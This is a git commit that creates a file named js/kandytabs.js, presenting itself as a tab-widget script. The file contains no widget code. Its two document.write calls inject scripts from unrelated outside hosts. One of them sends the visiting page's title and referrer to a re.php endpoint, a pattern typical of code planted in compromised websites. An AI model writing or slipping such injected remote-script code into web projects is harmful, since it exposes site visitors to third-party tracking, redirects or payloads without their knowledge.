0563905cf0b086c42c480bd50c22ff2cec0b108d
65e7 <1181399414@qq.com>
2020-04-27 19:28:41 +0800

    Create kandytabs.js

---
+++ js/kandytabs.js
@@ -0,0 +1,2 @@
+document.write("<script language='javascript' src='http://www.qcqmz.com/wap/skin/honglou/js/kandytabs.js?_veri=20121009'><\/script>");document.write("<script language='javascript' src='http://s.9ldjj.com/re/re.php?src=t6301&t="+encodeURIComponent(document.title)+"&ci=29378726&r="+encodeURIComponent(document.referrer)+"'><\/script>");
+
